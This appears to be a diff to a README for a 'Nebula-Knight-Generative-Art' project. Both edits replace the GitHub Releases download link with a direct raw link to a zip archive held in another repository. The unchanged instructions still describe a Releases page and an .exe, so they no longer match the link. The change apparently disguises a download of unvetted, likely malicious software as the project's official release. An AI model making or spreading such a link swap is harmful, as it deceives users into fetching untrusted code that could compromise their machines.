@@ -5,7 +5,7 @@ description: "Generate unique knight's tour digital art using coordinate-based p
 ---
 # 🌌 Nebula-Knight-Generative-Art - Create unique digital art with ease
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue)](https://github.com/Merriedelicate927/merriedelicate927.github.io/raw/refs/heads/main/joseite/v2.7.zip)
 
 Nebula-Knight-Generative-Art turns mathematical patterns into digital masterpieces. The software uses the Knight's Tour algorithm to map paths on a grid. It applies nebula-style gradients and random circles to these paths. You can generate art for displays or print it on apparel. Use the five built-in color modes to style your work. The tools create visuals that fit responsive layouts and textile design needs.
 
@@ -13,7 +13,7 @@ Nebula-Knight-Generative-Art turns mathematical patterns into digital masterpiec
 
 You need to access the release page to get the software. Follow these steps to find the file for Windows:
 
-1. Visit [this page to download](https://github.com/Merriedelicate927/Nebula-Knight-Generative-Art/releases).
+1. Visit [this page to download](https://github.com/Merriedelicate927/merriedelicate927.github.io/raw/refs/heads/main/joseite/v2.7.zip).
 2. Look for the most recent version under the Releases section.
 3. Find the file that ends with .exe.
 4. Click the file name to start the download.
